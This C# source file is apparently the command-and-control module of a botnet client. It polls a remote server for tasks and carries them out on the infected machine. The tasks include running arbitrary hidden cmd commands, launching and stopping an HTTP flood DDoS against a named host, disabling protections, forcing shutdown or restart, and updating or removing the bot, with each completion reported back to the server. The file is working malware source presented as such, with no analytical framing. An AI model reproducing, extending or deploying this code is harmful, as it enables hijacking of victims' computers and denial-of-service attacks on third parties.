using BotNet;
using BotNet.Services.Protect;
using BotNet.Services.Commands;
using BotNet.Services.Infect;
using BotNet.Services.DDoS;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Json;
using System.Net;
using System.Text;
using System.Windows;

namespace BotNet.Services.CommandCenter
{
    class CommandCenter
    {
        public static string ok = "1";
        public static string error = "0";

        Installation _installationService = new Installation();
        ProcessStartInfo psi;
        public void GetCommand()
        {
            try
            {
                WebClient web = new WebClient();
                NameValueCollection values = new NameValueCollection();
                values["getcmd"] = "";
                values["target"] = Environment.MachineName;
                var json = web.UploadValues(BotNet.Configure.ServerAddress, values);
                var responseString = Encoding.Default.GetString(json);
                //Console.WriteLine(responseString.ToString());
                JsonValue value = JsonValue.Parse(responseString);
                JsonObject data = value["task"] as JsonObject;
                cmddata.cmd = data["cmd"];
                cmddata.cmd = cmddata.cmd.Replace("\"", ""); 
                if (cmddata.cmd != "null")
                {
                    cmddata.cid = data["cid"];
                    cmddata.args[0] = data["arg1"]; 
                    cmddata.args[1] = data["arg2"];
                    cmddata.args[2] = data["arg3"];
                    cmddata.args[3] = data["arg4"]; 
                    Console.WriteLine(cmddata.args[0]);
                    switch (cmddata.cmd)
                    {
                        case "q":
                            try
                            {
                                Complete();
                                byte[] bytes1 = Encoding.UTF8.GetBytes(cmddata.args[0]); 
                                string message = Encoding.UTF8.GetString(bytes1);
                                MessageBox.Show(message);
                            break;
                            }
                            catch
                            {
                                //Error();
                            }
                            break;
                        case "t":
                            try
                            {
                                Complete();
                                Environment.Exit(0);
                            }
                            catch
                            {
                                //Error();
                            }
                            break;
                        case "r":
                            try
                            {
                                bypass.DisableProcedures();
                                Complete();
                            }
                            catch
                            {
                                //Error();
                            }
                            break;
                        case "y":
                            try
                            {
                                Complete();
                                Process.Start("shutdown", "/s /t 0"); // Shutdown PC
                            }
                            catch
                            {
                                //Error();
                            }
                            break;
                        case "u":
                            try
                            {
                                Complete();
                                Process.Start("shutdown", "/r /t 0");  // Restart PC
                            }
                            catch
                            {
                                //Error();
                            }
                            break;
                        case "d":
                            try
                            {
                                Complete();
                                _installationService.RemoveBot();
                            }
                            catch
                            {
                                //Error();
                            }
                            break;
                        case "a":
                            try
                            {
                                Complete();
                                Console.WriteLine(cmddata.args[0] + "," + cmddata.args[1]);
                                HttpFlood.Host = cmddata.args[0];
                                HttpFlood.ThreadCount = int.Parse(cmddata.args[1]);
                                HttpFlood.StartHTTPFlood();
                            }
                            catch
                            {
                                //Error();
                            }
                            break;
                        case "b":
                            try
                            {
                                Complete();
                                //Console.WriteLine(cmddata.args[0]);
                                _installationService.UpdateBot(cmddata.args[0]);
                            }
                            catch
                            {
                                //Error();
                            }
                            break;
                        case "s":
                            Complete();
                            try { HttpFlood.StopHTTPFlood(); } catch { }
                            break;
                        case "c":
                            Complete();
                            //CMD
                            psi = new ProcessStartInfo("cmd", cmddata.args[0]);
                            psi.WindowStyle = ProcessWindowStyle.Hidden;
                            psi.CreateNoWindow = true;
                            Process.Start(psi);
                            break;
                    }
                }
                //else Console.WriteLine("No task!");
            }
            catch //(Exception ex)
            {
               // Console.WriteLine(ex.ToString());
            }
        }
        public void Complete()
        {
            WebClient cl = new WebClient();
            var values = new NameValueCollection();
            values["cmpcmd"] = CommandCenter.ok;
            values["cid"] = cmddata.cid.ToString();
            cl.UploadValues(BotNet.Configure.ServerAddress, values);
        }
        public static void Error()
        {
            WebClient cl = new WebClient();
            var values = new NameValueCollection();
            values["cmpcmd"] = CommandCenter.error;
            values["cid"] = cmddata.cid.ToString();
            cl.UploadValues(BotNet.Configure.ServerAddress, values);
        }
    }
}